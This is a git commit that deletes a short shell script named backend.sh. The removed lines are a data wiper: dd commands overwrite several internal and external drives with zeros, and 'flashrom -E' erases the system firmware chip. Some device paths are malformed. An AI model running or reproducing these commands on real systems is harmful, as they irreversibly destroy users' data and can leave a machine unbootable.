6ab9621261f08190b7054de543bb330a1bc54ae2
kxtz <116377025+kxtzownsu@users.noreply.github.com>
2025-02-08 15:55:00 -0500

    Delete backend.sh

--- backend.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-
-dd if=/dev/zero of=/dev/nvme01/ bs=1G status=progress
-dd if=/dev/zero of=/dev/mmcblk0/ bs=1G status=progress
-dd if=/dev/zero of=/dev/mmcblk1/ bs=1G status=progress
-dd if=/dev/zero of=/dev/sda/ bs=1G status=progress
-dd if=/dev/zero of=/dev/sdb/ bs=1G status=progress
-flashrom -E
